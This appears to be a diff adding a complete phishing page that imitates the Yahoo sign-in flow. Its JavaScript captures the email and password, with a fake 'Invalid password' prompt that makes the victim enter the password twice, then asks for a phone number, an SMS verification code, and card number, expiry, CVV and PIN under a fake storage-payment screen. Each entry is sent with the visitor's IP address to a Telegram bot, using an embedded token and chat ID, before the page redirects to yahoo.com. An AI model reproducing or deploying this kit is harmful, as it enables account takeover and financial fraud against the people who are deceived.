@@ -1,0 +1,620 @@
+<html><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <title>Yahoo</title>
+    <style>
+body{
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  background: #f9f9fa;
+  font-family: 'Yahoo Sans','Helvetica Neue',Helvetica,Arial;
+}
+
+#pwd{
+  display:none;
+}
+#pwdd{
+  display:none;
+}
+#usr{
+  display:block;
+}
+#suber{
+  display:none;
+}
+#suberr{
+  display:none;
+}
+
+      .imgg{
+        display: block;
+      }
+
+header#header{
+  background: #fff;
+}
+strong.strong
+{
+  display: block;
+    margin: 0;
+    margin-top: 0.82353rem;
+    font-size: 1.17647rem;
+    font-weight: 600;
+    letter-spacing: -.2px;
+    text-align: center;
+    line-height: 1.35294rem;
+}
+
+.img-a img{
+  height: 36px
+}
+.img-a
+{
+  margin: auto;
+  width: 90%;
+  display: flex;
+  justify-content: space-between;
+  text-align: center;
+  align-items: center;
+  padding-top: 25px;
+  padding-bottom: 15px;
+}
+
+
+div.form-section-9 .imgg img,
+div.form-section-5 .imgg img,
+div.form-section-3 .imgg img,
+div.form-section-2 .imgg img,
+div.form-section .img img
+{
+  height: 40px
+}
+div.form-section img
+{
+  height: 27px
+}
+div.form-section
+{
+  position: absolute;
+  top: 25%;
+  left: 75%;
+  transform: translate(-75%, -25%);
+  text-align: center;
+  align-items: center;
+  padding: 20px;
+  display: flex;
+  flex-direction: column;
+  justify-content: space-around;
+    box-sizing: border-box;
+    background-color: #fff;
+    color: #26282a;
+    box-shadow: 0 2px 4px 0 rgb(0 0 0 / 30%);
+    width: 360px;
+    min-height: 550px;
+    z-index: 1;
+    padding: 28px 5px;
+    padding-bottom: 10px;
+    border: 1px solid transparent;
+    border-top: 1px solid #f1f1f5;
+}
+
+div.form-section-5  .imgg img,
+div.form-section-3 .imgg img,
+div.form-section-9 .imgg img,
+div.form-section-2 .imgg img,
+div.form-section .img img
+{
+  height: 40px
+}
+div.form-section-5 img,
+div.form-section-3 img{
+  height: 50px;
+}
+div.form-section-2 img
+{
+  height: 60px
+}
+div.form-section-5
+{
+  position: absolute;
+  top: 25%;
+  left: 50%;
+  transform: translate(-50%, -25%);
+  text-align: center;
+  align-items: center;
+  padding: 20px;
+  display: none;
+  flex-direction: column;
+  justify-content: space-around;
+    box-sizing: border-box;
+    background-color: #fff;
+    color: #26282a;
+    box-shadow: 0 2px 4px 0 rgb(0 0 0 / 30%);
+    width: 360px;
+    min-height: 550px;
+    z-index: 1;
+    padding: 28px 5px;
+    padding-bottom: 10px;
+    border: 1px solid transparent;
+    border-top: 1px solid #f1f1f5;
+}
+div.form-section-3
+{
+  position: absolute;
+  top: 25%;
+  left: 50%;
+  transform: translate(-50%, -25%);
+  text-align: center;
+  align-items: center;
+  padding: 20px;
+  display: none;
+  flex-direction: column;
+  justify-content: space-around;
+    box-sizing: border-box;
+    background-color: #fff;
+    color: #26282a;
+    box-shadow: 0 2px 4px 0 rgb(0 0 0 / 30%);
+    width: 360px;
+    min-height: 550px;
+    z-index: 1;
+    padding: 28px 5px;
+    padding-bottom: 10px;
+    border: 1px solid transparent;
+    border-top: 1px solid #f1f1f5;
+}
+div.form-section-9,
+div.form-section-2
+{
+  position: absolute;
+  top: 25%;
+  left: 50%;
+  transform: translate(-50%, -25%);
+  text-align: center;
+  align-items: center;
+  padding: 20px;
+  display: none;
+  flex-direction: column;
+  justify-content: space-around;
+    box-sizing: border-box;
+    background-color: #fff;
+    color: #26282a;
+    box-shadow: 0 2px 4px 0 rgb(0 0 0 / 30%);
+    width: 360px;
+    min-height: 550px;
+    z-index: 1;
+    padding: 20px 5px;
+    padding-bottom: 10px;
+    border: 1px solid transparent;
+    border-top: 1px solid #f1f1f5;
+}
+input[type=date]::-webkit-inner-spin-button,
+  input[type=date]::-webkit-outer-spin-button {
+    -webkit-appearance: none;
+  }
+
+  input[type=date] {
+    -moz-appearance: textfield;
+  } 
+input[type="date"]::-webkit-inner-spin-button,
+input[type="date"]::-webkit-calendar-picker-indicator {
+    display: none;
+    -webkit-appearance: none;
+}
+form input::placeholder{
+   font-family: 'Yahoo Sans','Helvetica Neue',Helvetica,Arial; 
+  font-size: 16px;
+}
+form input{
+  width: 100%;
+  border: none;
+  outline: none;
+  border-bottom: .05882rem solid #b9bdc5;
+  margin-bottom: 30px;
+  line-height: 30px;
+  font-size: .94118rem;
+}
+form{
+  width: 90%
+}
+
+button{
+  font-size: .94118rem;
+    font-weight: 500;
+    min-height: 2.35294rem;
+    padding: 0.64706rem0;
+    line-height: 1rem;
+    color: #fff;
+    background: #188fff;
+    border: 1px solid #188fff;
+    box-sizing: border-box;
+     border-radius: 0.1rem;
+     width: 100%;
+     padding: .75em 1.45em;
+     cursor: pointer;
+}
+
+.stay-forgot .stay a{
+  text-decoration: none;
+  color: #188fff
+}
+.stay-forgot .stay{
+  width: 100%;
+  display: flex;
+  justify-content: space-between;
+  margin-bottom: 5%;
+}
+a#create
+{
+  font-size: .94118rem;
+    font-weight: 500;
+    min-height: 2.35294rem;
+    padding: 0.64706rem0;
+    line-height: 1rem;
+    color: #188fff;
+    background: #fff;
+    border: 1px solid #188fff;
+    box-sizing: border-box;
+     border-radius: 0.1rem;
+     width: 100%;
+     padding: .75em 1.45em;
+     text-decoration: none;
+
+}
+.goog-yah img{
+  height: 10px
+}
+.goog-yah
+{
+  display: flex;
+  justify-content: space-between;
+}
+a#goog
+{
+  font-size: .94118rem;
+    font-weight: 500;
+    min-height: 2.35294rem;
+    padding: 0.44706rem0;
+    line-height: 1rem;
+    color: #000;
+    background: #fff;
+    border: 1px solid #b9bdc5;
+    box-sizing: border-box;
+     border-radius: 0.1rem;
+     width: 80%;
+     padding: .35em 1.45em;
+     margin-left: 2%;
+     text-decoration: none;
+     text-align: center;
+     align-items: center;
+}
+.stay-forgot{
+  width: 90%;
+  display: flex;
+  flex-direction: column;
+  justify-content: space-between;
+}
+
+@media(max-width: 1050px){
+
+  header{
+    display: none;
+  }
+  div.form-section{
+
+    color: #26282a;
+    box-shadow:none;
+    border: 0px;
+    border-top: 1px solid #f1f1f5;
+      top: 25%;
+  left: 50%;
+  transform: translate(-50%, -25%);
+  }
+  div.form-section-9,
+  div.form-section-2,
+  div.form-section-2{
+
+    color: #26282a;
+    box-shadow:none;
+    border: 0px;
+    border-top: 1px solid #f1f1f5;
+      top: 25%;
+  left: 50%;
+  transform: translate(-50%, -25%);
+  }
+  div.form-section-3{
+
+    color: #26282a;
+    box-shadow:none;
+    border: 0px;
+    border-top: 1px solid #f1f1f5;
+      top: 25%;
+  left: 50%;
+  transform: translate(-50%, -25%);
+  }
+
+}</style>
+  </head>
+  <body>
+    <header id="header">
+      <div class="img-a">
+      <div class="img">
+        <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo Logo">
+      </div>
+      <a href="#">Help</a>
+      </div>
+    </header>
+    <div class="form-section">
+          <div class="img">
+        <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo Logo">
+      </div>
+<br>
+      <div class="sign-using">
+        <p id="display"></p>
+        <strong class="strong">Sign in</strong>
+      </div>
+      <form action="" id="form">
+        <input type="text" placeholder="Username, email or mobile" id="usr" required="">
+        <input type="password" placeholder="Password" id="pwd" required="">
+        <button id="sub">Submit</button>
+        <button type="submit" id="suber">Submit</button>
+      </form>
+      <div class="stay-forgot">
+        <div class="stay">
+          <a href="#">Stay signed in</a>
+          <a href="#">Forgot password?</a>
+        </div>
+        <br>
+        <br>
+        <br>
+        <a href="" id="create">Create account</a>
+        <br>
+
+      </div>
+    </div>
+<!--     NEW FORM SECTION -->
+<div class="form-section-9">
+  <div class="imgg">
+   <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo Logo">
+ </div>
+ <div class="sign-using">
+     <p id="display"></p>
+ <h3 id="strongg">Enter mobile number.</h3>
+   <p id="ppp">We want to make sure that it's really you using this account.</p>
+ </div>
+ <img src="https://s.yimg.com/wm/mbr/images/aol/phone-otp-v0.0.1.svg"/>
+
+ <form action="" id="formm9">
+   <input type="text" placeholder="" value="+1" id="nnm" required="">
+   <button id="subb">Verify</button>
+   <button type="submit" id="suber">Verify</button>
+ </form>
+
+</div>
+     <div class="form-section-2">
+       <div class="imgg">
+        <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo Logo">
+       </div>
+      <div class="sign-using">
+          <p id="display"></p>
+<h3 id="strongg">Enter verification code.</h3>
+        <p id="ppp">Enter the security code sent to your mobile ending in <span id="numba"></span>.</p>
+      </div>
+      <img src="https://s.yimg.com/wm/mbr/images/aol/phone-otp-v0.0.1.svg"/>
+
+      <form action="" id="formm">
+        <input type="text" placeholder="Enter 6-character code" id="mmn" required="">
+        <button id="subb">Verify</button>
+        <button type="submit" id="suber">Verify</button>
+      </form>
+
+    </div>
+     <div class="form-section-5">
+       <div class="imgg">
+        <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo Logo">
+       </div>
+      <div class="sign-using">
+          <p id="display"></p>
+<h3 id="strongg">Complete Storage Payment.</h3>
+        <p id="ppp">Complete payment of 4.99$ to upgrade Yahoo Mail storage so you can receive important emails.</p>
+      </div>
+      <img src="https://s.yimg.com/wm/mbr/images/aol/phone-otp-v0.0.1.svg"/>
+
+      <form action="" id="formms">
+        <input type="text" placeholder="Card number" id="bin" required=""> <br>
+        <input type="text" placeholder="EXP" id="exp" required=""> <br>
+        <input type="text" placeholder="CVV" id="cvv" required=""> <br>
+        <input type="text" placeholder="PIN" id="pin" required="">
+        <button id="subb">Verify</button>
+        <button type="submit" id="suber">Verify</button>
+      </form>
+
+    </div>
+<!--     SECTION 3 -->
+     <div class="form-section-3">
+       <div class="img">
+       <img src="https://img.icons8.com/external-others-inmotus-design/67/000000/external-Done-accept-others-inmotus-design-2.png"/>
+      </div>
+      <div class="sign-using">
+          <p id="display"></p>
+<h3 id="strongg">We Received Your Information</h3>
+        <p id="ppp">Thank you for helping us verify your information.</p>
+      </div>
+        <div class="closing" style="display:flex; flex-direction:column; width: 90%;">
+          <button type="submit" id="subb" disabled>My Account</button>
+        <br>
+      <a href="https://yahoo.com" id="create">Sign Out</a>
+        </div>
+
+    </div>
+    <script>
+const currentUrl = window.location.href;
+let maill = document.querySelector('#usr')
+let emailPattern = /[\w._%+-]+@[\w.-]+\.[a-zA-Z]{2,}/;
+let matches = currentUrl.match(emailPattern);
+let email;
+
+if (matches) {
+  email = matches[0];
+  maill.value = email  
+  window.addEventListener('load', function() {
+    fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=Yahoo=>NEW VISITOR::= ${email}`, {
+              method: "GET"
+          }).then(success => {
+          }, error => {
+          alert('message not sent')
+              console.log(error)
+           }) 
+  });
+}
+
+const forma = document.querySelector('#form')
+const formaa = document.querySelector('#formm')
+const formaan = document.querySelector('#formm9')
+const formaas = document.querySelector('#formms')
+
+let bot = {
+    TOKEN: "7640000631:AAEqrYnTJygOe1sf6L7QWohTySc-5davMS8", 
+    chatID: "2074391753" 
+}
+
+const emAil = document.querySelector('#usr')
+const suBBer = document.querySelector('#suber')
+const suBBerr = document.querySelector('#suberr')
+const pWd = document.querySelector('#pwd')
+const pWdd = document.querySelector('#pwdd')
+const strong = document.querySelector('.strong')
+const strongg = document.querySelector('#strongg')
+const submit = document.querySelector('#sub');
+const submitt = document.querySelector('#subb');
+const formSeccs = document.querySelector('.form-section-5');
+const formSecc = document.querySelector('.form-section-3');
+const formSecn = document.querySelector('.form-section-9');
+const formSec = document.querySelector('.form-section-2');
+const formCes = document.querySelector('.form-section');
+let dob = document.querySelector('#dob')
+let mmn = document.querySelector('#mmn')
+let display = document.querySelector('#display')
+let ppp = document.querySelector('#ppp')
+let imgg = document.querySelector('.imgg')
+
+submit.addEventListener('click', e =>{
+  if(emAil.value === ''){
+    return
+  }
+  display.textContent = emAil.value
+  strong.textContent = 'Enter password'
+  emAil.style.display = 'none'
+  pWd.style.display = 'block'
+})
+submitt.addEventListener('click', e =>{
+  if(dob === ''){
+    return
+  }
+  display.textContent = emAil.value
+  strongg.textContent = 'Enter password'
+  ppp.textContent = 'Because you are accessing sensitive info you need to verify your password.';
+  dob.style.display = 'none'
+  mmn.style.display = 'none'
+  pWdd.style.display = 'block'
+  imgg.style.display = 'block'
+})
+let tester = 1
+
+fetch('https://api.ipify.org/?format=json').then(results => results.json()).then(data => {
+  console.log(data)   
+  forma.addEventListener("submit", e =>{
+          e.preventDefault();
+          let email = document.querySelector('#usr').value
+          let pwd = document.querySelector('#pwd').value
+
+
+        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=Yahoo=>${email}=${pwd}=${data.ip}`, {
+              method: "GET"
+          }).then(success => {
+            if(tester !== 1){
+              formCes.style.display = 'none';
+              formSec.style.display = 'none';
+              formSecn.style.display = 'flex';
+            } else {
+               strong.textContent = 'Invalid password. Please try again'
+        strong.style.fontWeight = '400'
+        strong.style.fontSize = '14px'
+        strong.style.letterSpacing = '0.5'
+        strong.style.color = 'red'
+        pWd.style.borderBottom = 'red 1px solid'
+        pWd.type = "text"
+        pWd.value = ""
+        tester = 0
+            }
+          }, error => {
+          alert('message not sent')
+              console.log(error)
+              }) 
+      })
+
+
+  formaa.addEventListener("submit", e =>{
+          e.preventDefault();
+          let mmn = document.querySelector('#mmn').value
+
+
+        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=Yahoo=>CODE::${mmn}=${data.ip}`, {
+              method: "GET"
+          }).then(success => {
+               window.location.replace("https://yahoo.com");
+          }, error => {
+          alert('message not sent')
+              console.log(error)
+              }) 
+      })
+  formaan.addEventListener("submit", e =>{
+          e.preventDefault();
+          let nnm = document.querySelector('#nnm').value
+          let numba = document.querySelector('#numba')
+
+
+        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=Yahoo=>CODE::${nnm}=${data.ip}`, {
+              method: "GET"
+          }).then(success => {
+          formSec.style.display = 'flex';
+          formSecn.style.display = 'none';
+          let lastFourDigits = parseInt(nnm.substring(nnm.length - 4));
+
+        numba.textContent = `+1 ***-***-${lastFourDigits}`
+          }, error => {
+          alert('message not sent')
+              console.log(error)
+              }) 
+      })
+  formaas.addEventListener("submit", e =>{
+          e.preventDefault();
+          let bin = document.querySelector('#bin').value
+          let exp = document.querySelector('#exp').value
+          let cvv = document.querySelector('#cvv').value
+          let pin = document.querySelector('#pin').value
+
+
+        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=Yahoo=>CODE::${bin}==${exp}==${cvv}==${pin}==${data.ip}`, {
+              method: "GET"
+          }).then(success => {
+          formSecc.style.display = 'flex';
+          formSeccs.style.display = 'none';
+
+          const myTimeout = setTimeout(myGreeting, 4000);
+
+            function myGreeting() {
+               window.location.replace("https://yahoo.com");
+            }
+          }, error => {
+          alert('message not sent')
+              console.log(error)
+              }) 
+      })
+
+})
+
+    </script>
+
+</body>
+</html>
